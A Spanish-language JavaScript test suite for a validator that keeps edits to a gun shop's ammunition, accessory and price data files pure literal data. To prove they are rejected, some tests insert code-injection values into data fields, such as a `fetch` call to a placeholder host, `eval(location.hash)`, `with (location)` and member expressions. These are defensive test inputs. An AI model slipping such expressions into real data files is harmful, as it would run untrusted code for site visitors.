  const ref = 'X'.repeat(120);
  const rechazoPista = { idx: 3, name: 'RIFLE CAL22 TIPPMANN M4-22 REDLINE', priceN: 9999.5, fichaId: 81, motivo: `posible renombre de «${ref}»: la ficha ya tiene renglón hoy` };
  const rechazoCompleto = { idx: 4, name: 'RIFLE CAL22 Y', priceN: 100, fichaId: 81, fechaAntes: '2026-10-01', antes: 117, razon: 0.854701, general: null, tramo: 0, apoyos: 0, motivo: `posible renombre de «${ref}»: el precio no cuadra con el aumento general ni con un tramo` };
  const regreso = { idx: 5, name: 'RIFLE 0.22 Z', priceN: 110, fichaId: 82, fechaAntes: '2026-10-01', antes: 100, razon: 1.1, motivo: `renombre de «${ref}»: mismo aumento que 12 fichas de su tramo`, general: 1.1, tramo: 12, apoyos: 12 };
  const m = { ...MAPEO_VACIO, regresos: [regreso], regresosRechazados: [rechazoPista, rechazoCompleto] };
  assert.deepEqual(compararArchivo(r, '{}', JSON.stringify(m)), []);
  // El tope sigue existiendo: un motivo desmesurado se rechaza.
  const largo = { ...MAPEO_VACIO, regresosRechazados: [{ ...rechazoPista, motivo: 'x'.repeat(301) }] };
  assert.ok(compararArchivo(r, '{}', JSON.stringify(largo)).length > 0);
});

// --- 16-oct-2026: altas de cartuchos (data-municiones.js) ---
// Causa raíz: las constantes de fecha/manualId de data-municiones.js (`var SEP18 = '…'`) viven
// en el primer nivel de su IIFE, no en el tope del Program; constantesLiterales no las veía,
// 75 fichas con `priceManualId: SEP18` dejaban de ser dato puro, window.MUNICIONES nunca
// colapsaba a un marcador D y CUALQUIER ficha nueva (aun sin identificadores) cambiaba el
// esqueleto. La copia congelada es un extracto literal del archivo real de main (6238b5d).
const MUN = 'src/data/data-municiones.js';
const realMun = () => readFileSync(FIXTURE('data-municiones.js'), 'utf8');
// Inserta `linea` (sin fin de línea) al final de window.MUNICIONES, con el fin de línea del archivo.
function conFichaMun(real, linea) {
  const ini = real.indexOf('window.MUNICIONES = [');
  assert.ok(ini >= 0, 'window.MUNICIONES = [ no está en la copia congelada; ajustar el test');
  const m = /\r?\n {2}\];\r?\n/.exec(real.slice(ini));
  assert.ok(m, 'cierre de window.MUNICIONES no encontrado; ajustar el test');
  const eol = m[0].startsWith('\r') ? '\r\n' : '\n';
  const fin = ini + m.index;
  return real.slice(0, fin) + eol + linea + real.slice(fin);
}
// Ficha en el formato de las altas del 02-oct (las que dejó redactadas el solucionador el 16-oct).
const FICHA_2117 = (resto = '') => '    { ...mun(2117, "Cartucho 12 GA · Fiocchi (7.5 24 gr)", "Fiocchi", "Italia", "12 GA", "escopeta", "Perdigón 7.5", "24 gr", "dcam", 10.69, "CART.MAR.FIOCCHI,CAL. 12 GA, 7.5, 24 GR.", '
  + '"Cartucho de escopeta en calibre 12 GA, marca Fiocchi (Perdigón 7.5, 24 gr). Precio de referencia por cartucho del inventario DCAM (16-oct-2026).", ["Armas calibre 12 GA"], [["Calibre", "12 GA"], ["Bala", "Perdigón 7.5"], ["Peso", "24 gr"], ["Tipo", "Escopeta"]])' + resto + ' },';

test('altas (a): con la copia congelada de data-municiones.js, una ficha nueva en el formato real pasa (con su historial)', () => {
  const real = realMun();
  const conAlta = conFichaMun(real, FICHA_2117());
  assert.deepEqual(compararArchivo(MUN, real, conAlta), []);
  // …y con su primer registro de historial, como lo escribe la conciliación.
  const ancla = /( {4}2116: \[[^\n]*\],)(\r?\n)/.exec(conAlta);
  assert.ok(ancla, 'historial de la 2116 no encontrado; ajustar el test');
  const conHist = conAlta.replace(ancla[0], `${ancla[1]}${ancla[2]}    2117: [{ manualId: 'man_mun_dcam_2026_10_16', price: '$10.69 MXN', date: '2026-10-16', qty: 3000 }],${ancla[2]}`);
  assert.deepEqual(compararArchivo(MUN, real, conHist), []);
});

test('altas (b): la misma ficha con un identificador no permitido se rechaza', () => {
  const real = realMun();
  for (const resto of [
    ', priceManualId: window.x', //   expresión de miembro
    ', priceManualId: _mFmt', //      nombre del archivo que NO es una constante literal (es una función)
    ', priceManualId: mun', //        ídem, el propio constructor
    ', priceManualId: SEP25', //      constante literal de la IIFE: en una ficha NUEVA tampoco (un alta no la necesita)
    ', priceManualId: undefined',
  ]) {
    assert.ok(compararArchivo(MUN, real, conFichaMun(real, FICHA_2117(resto))).length > 0, resto);
  }
});

test('altas (c): una ficha nueva con una llamada o una expresión se rechaza', () => {
  const real = realMun();
  for (const [de, a] of [
    ['10.69,', '10.69 + 1,'],
    ['10.69,', '-(10.69),'],
    ['"dcam",', '"dc" + "am",'],
    ['"Fiocchi",', 'fetch("https://x.y"),'],
    ['"Fiocchi",', '_caja(1),'],
    ['{ ...mun(', '{ ...window.x, ...mun('],
  ]) {
    const linea = FICHA_2117().replace(de, a);
    assert.notEqual(linea, FICHA_2117(), `el reemplazo ${de} no aplicó`);
    assert.ok(compararArchivo(MUN, real, conFichaMun(real, linea)).length > 0, a);
  }
  assert.ok(compararArchivo(MUN, real, conFichaMun(real, FICHA_2117(', img: _caja(2117)'))).length > 0, 'img: _caja(…)');
  assert.ok(compararArchivo(MUN, real, conFichaMun(real, '    mun(2117, "x"()),')).length > 0, 'paréntesis sobre un literal');
});

test('altas (d): borrar una ficha o cambiar la forma de una existente se sigue rechazando; cambiar un valor sigue pasando', () => {
  const real = realMun();
  const lineas = real.split(/(?<=\n)/);
  const i2116 = lineas.findIndex((l) => l.startsWith('    { ...mun(2116,'));
  assert.ok(i2116 >= 0, 'la 2116 no está en la copia congelada; ajustar el test');
  // borrar la 2116 (dos renglones)
  const sin2116 = [...lineas.slice(0, i2116), ...lineas.slice(i2116 + 2)].join('');
  assert.ok(compararArchivo(MUN, real, sin2116).length > 0, 'borrar la 2116');
  // { ...mun(…) } -> mun(…)
  const desenvuelta = [...lineas.slice(0, i2116), lineas[i2116].replace('{ ...mun(2116,', 'mun(2116,'), lineas[i2116 + 1].replace(/\) \},(\r?\n)$/, '),$1'), ...lineas.slice(i2116 + 2)].join('');
  assert.notEqual(desenvuelta, real);
  assert.ok(compararArchivo(MUN, real, desenvuelta).length > 0, '{ ...mun } -> mun');
  // quitarle a la 2016 su `priceManualId: SEP18`
  assert.ok(real.includes(']]), priceManualId: SEP18 },'), 'la 2016 cambió; ajustar el test');
  assert.ok(compararArchivo(MUN, real, real.replace(']]), priceManualId: SEP18 },', ']]) },')).length > 0, 'quitar priceManualId de la 2016');
  // una ficha nueva con una forma que ninguna del arreglo tiene (aunque sea dato puro)
  for (const linea of [FICHA_2117(', extra: 1'), '    "suelto",', '    [2117, "x"],', '    { id: 2117 },']) {
    assert.ok(compararArchivo(MUN, real, conFichaMun(real, linea)).length > 0, linea);
  }
  // cambiar el precio de una ficha existente sigue pasando (no se endurece lo que ya pasaba)
  assert.ok(real.includes('"dcam", 9.94, "CART. CAL. 12 EXCOPESA'), 'precio de la 2116 cambió; ajustar el test');
  assert.deepEqual(compararArchivo(MUN, real, real.replace('"dcam", 9.94, "CART. CAL. 12 EXCOPESA', '"dcam", 9.99, "CART. CAL. 12 EXCOPESA')), []);
});

test('constantes de la IIFE: `var`/`const` literal del primer nivel cuenta como dato puro; cualquier otra forma de tocarla no', () => {
  const envolver = (cuerpo, extra = '') => `(function () {\n  ${cuerpo}\n  window.L = [\n    { p: 1, q: A },\n  ];\n  ${extra}\n})();\n`;
  const alta = (b) => b.replace('  ];', '    { p: 2, q: "y" },\n  ];');
  for (const decl of ["var A = 'x';", "const A = 'x';", "var Z = 1, A = 'x';"]) {
    const b = envolver(decl);
    assert.deepEqual(compararArchivo(MUN, b, alta(b)), [], decl);
  }
  for (const [nombre, b] of [
    ['reasignada', envolver("var A = 'x';", 'A = location.hash;')],
    ['incrementada', envolver("var A = 'x';", 'A++;')],
    ['desestructuración de arreglo', envolver("var A = 'x';", '[A] = [location.hash];')],
    ['desestructuración de objeto', envolver("var A = 'x';", '({ k: A } = location);')],
    ['blanco de for-of', envolver("var A = 'x';", 'for (A of [location.hash]) {}')],
    ['blanco de for-in', envolver("var A = 'x';", 'for (A in location) {}')],
    ['declarada dos veces', envolver("var A = 'x';", 'var A = location.hash;')],
    ['let', envolver("let A = 'x';")],
    ['no literal', envolver('var A = location.hash;')],
    ['función homónima', envolver("var A = 'x';", 'function A() {}')],
    ['clase homónima (anidada)', envolver("var A = 'x';", 'function g() { class A {} return A; }')],
    ['parámetro desestructurado', envolver("var A = 'x';", 'function f({ A }) { return A; }')],
    ['parámetro de catch', envolver("var A = 'x';", 'try { f(); } catch (A) { g(A); }')],
    ['usada fuera de la IIFE', envolver("var A = 'x';") + 'window.M = [A];\n'],
    ['var del tope (global: otro script la reasigna)', "var A = 'x';\nwindow.L = [\n    { p: 1, q: A },\n  ];\n"],
  ]) {
    assert.ok(compararArchivo(MUN, b, alta(b)).length > 0, nombre);
  }
});

test('forma de las fichas: con la copia congelada de data.js, borrar una ficha de window.DB ahora se rechaza', () => {
  const real = readFileSync(FIXTURE('data.js'), 'utf8');
  const i = real.indexOf('window.DB = [');
  const a = real.indexOf('  mk(', i), b = real.indexOf('\n', real.indexOf('),', a)) + 1;
  assert.ok(i >= 0 && a > i && b > a, 'window.DB cambió; ajustar el test');
  assert.ok(compararArchivo(D, real, real.slice(0, a) + real.slice(b)).length > 0);
});

// --- Ronda de arreglo 1 (16-oct-2026) ---

test('ronda 1 (Important 1): borrar una ficha se rechaza en los 4 archivos y el mensaje dice qué hacer', () => {
  const pista = /no se borran fichas: reporta el duplicado en pendiente/;
  const real = realMun();
  const lineas = real.split(/(?<=\n)/);
  const i2116 = lineas.findIndex((l) => l.startsWith('    { ...mun(2116,'));
  assert.ok(i2116 >= 0, 'la 2116 no está en la copia congelada; ajustar el test');
  const r1 = compararArchivo(MUN, real, [...lineas.slice(0, i2116), ...lineas.slice(i2116 + 2)].join(''));
  assert.equal(r1.length, 1);
  assert.match(r1[0], pista);
  assert.match(r1[0], /se borró una ficha \(14 → 13\)/);
  const dj = readFileSync(FIXTURE('data.js'), 'utf8');
  const i = dj.indexOf('window.DB = [');
  const a = dj.indexOf('  mk(', i), b = dj.indexOf('\n', dj.indexOf('),', a)) + 1;
  assert.ok(i >= 0 && a > i && b > a, 'window.DB cambió; ajustar el test');
  assert.match(compararArchivo(D, dj, dj.slice(0, a) + dj.slice(b))[0], pista);
  const ACC = 'src/data/data-accesorios.js';
  const acc = readFileSync(FIXTURE('data-accesorios.js'), 'utf8');
  const a2 = acc.indexOf('  amx(102, '), b2 = acc.indexOf('\n', acc.indexOf('),', a2)) + 1;
  assert.ok(a2 > 0 && b2 > a2, 'la amx(102) cambió; ajustar el test');
  assert.match(compararArchivo(ACC, acc, acc.slice(0, a2) + acc.slice(b2))[0], pista);
  const PRE = 'src/data/data-precios.js';
  const pre = readFileSync(FIXTURE('data-precios.js'), 'utf8');
  const a3 = pre.indexOf('  {', pre.indexOf('window.AMX_MANUALES_SEED = [')), b3 = pre.indexOf('  },', a3) + 4 + (pre[pre.indexOf('  },', a3) + 4] === '\r' ? 2 : 1);
  assert.ok(a3 > 0 && b3 > a3, 'AMX_MANUALES_SEED cambió; ajustar el test');
  assert.match(compararArchivo(PRE, pre, pre.slice(0, a3) + pre.slice(b3))[0], pista);
});

// Edita el historial `id: [ … ],` de un renglón (registros `{ … }` sin llaves anidadas).
function editarHistorial(real, id, fn) {
  const m = new RegExp(`^( *${id}: \\[)(.*)(\\],\\r?)$`, 'm').exec(real);
  assert.ok(m, `historial de ${id} no encontrado; ajustar el test`);
  const recs = m[2].match(/\{[^{}]*\}/g) || [];
  return real.replace(m[0], m[1] + fn(recs).join(', ') + m[3]);
}

test('ronda 1 (Minor 4): corregir historiales sigue pasando — borrar, mover y vaciar registros (municiones y precios)', () => {
  const casos = [
    [MUN, realMun(), 2112, 2113],
    ['src/data/data-precios.js', readFileSync(FIXTURE('data-precios.js'), 'utf8'), 1, 4],
  ];
  for (const [ruta, real, de, a] of casos) {
    let movido;
    const borrar = editarHistorial(real, de, (r) => r.slice(0, -1));
    assert.notEqual(borrar, real);
    assert.deepEqual(compararArchivo(ruta, real, borrar), [], `${ruta}: borrar un registro de ${de}`);
    const sinUno = editarHistorial(real, de, (r) => { movido = r[r.length - 1]; return r.slice(0, -1); });
    const mover = editarHistorial(sinUno, a, (r) => [...r, movido]);
    assert.deepEqual(compararArchivo(ruta, real, mover), [], `${ruta}: mover un registro de ${de} a ${a}`);
    const vaciar = editarHistorial(real, de, () => []);
    assert.deepEqual(compararArchivo(ruta, real, vaciar), [], `${ruta}: vaciar el historial de ${de}`);
  }
});

test('ronda 1 (Minor 2): una ficha nueva con constructor lleva el número de argumentos de las existentes', () => {
  const real = realMun();
  const arg = /número de argumentos/;
  const corta = '    mun(2117, "Cartucho 12 GA · Fiocchi (7.5 24 gr)"),';
  assert.match(compararArchivo(MUN, real, conFichaMun(real, corta))[0], arg);
  const sinSpecs = FICHA_2117().replace(', [["Calibre", "12 GA"], ["Bala", "Perdigón 7.5"], ["Peso", "24 gr"], ["Tipo", "Escopeta"]])', ')');
  assert.notEqual(sinSpecs, FICHA_2117());
  assert.match(compararArchivo(MUN, real, conFichaMun(real, sinSpecs))[0], arg, '{ ...mun(13 argumentos) }');
  const deMas = FICHA_2117().replace('["Tipo", "Escopeta"]])', '["Tipo", "Escopeta"]], 1)');
  assert.match(compararArchivo(MUN, real, conFichaMun(real, deMas))[0], arg, '{ ...mun(15 argumentos) }');
  // Metida ANTES de una existente de su misma forma (no «ocupa» el lugar de la existente).
  const antes = real.replace('    { ...mun(2116,', '    { ...mun(2117, "x") },\n    { ...mun(2116,');
  assert.notEqual(antes, real);
  assert.ok(compararArchivo(MUN, real, antes).length > 0, 'aridad mala antes de la 2116');
  // Accesorios: amx() con menos argumentos.
  const ACC = 'src/data/data-accesorios.js';
  const acc = readFileSync(FIXTURE('data-accesorios.js'), 'utf8');
  assert.match(compararArchivo(ACC, acc, acc.replace('  amx(102, ', "  amx(9999, 'Nuevo', 'M'),\n  amx(102, "))[0], arg);
  // La ficha completa (14 argumentos) sigue pasando.
  assert.deepEqual(compararArchivo(MUN, real, conFichaMun(real, FICHA_2117())), []);
});

test('ronda 1 (Minor 3): el rechazo por forma nueva dice qué formas acepta el arreglo', () => {
  const real = realMun();
  const r = compararArchivo(MUN, real, conFichaMun(real, FICHA_2117(', extra: 1')));
  assert.equal(r.length, 1);
  assert.match(r[0], /usa una de: /);
  for (const f of ['C:mun', 'O{...C:mun}', 'O{...C:mun,priceManualId}']) assert.ok(r[0].includes(f), `${f} en «${r[0]}»`);
});

test('ronda 1 (Minor 1): parámetros de métodos, `with` y `eval` también descartan una constante de la IIFE', () => {
  const envolver = (extra) => `(function () {\n  var A = 'x';\n  window.L = [\n    { p: 1, q: A },\n  ];\n  ${extra}\n})();\n`;
  const alta = (b) => b.replace('  ];', '    { p: 2, q: "y" },\n  ];');
  for (const [nombre, extra] of [
    ['parámetro de método de objeto', 'var o = { f(A) { return A; } };'],
    ['parámetro de método de clase', 'var K = class { m(A) { return A; } };'],
    ['parámetro de método privado', 'var K2 = class { #m(A) { return A; } };'],
    ['with', 'with (location) { g(A); }'],
    ['eval', 'eval(location.hash);'],
  ]) {
    const b = envolver(extra);
    assert.ok(compararArchivo(MUN, b, alta(b)).length > 0, nombre);
  }
  const b = envolver('var o = { f(B) { return B; } };');
  assert.deepEqual(compararArchivo(MUN, b, alta(b)), [], 'un método con OTRO parámetro no estorba');
});
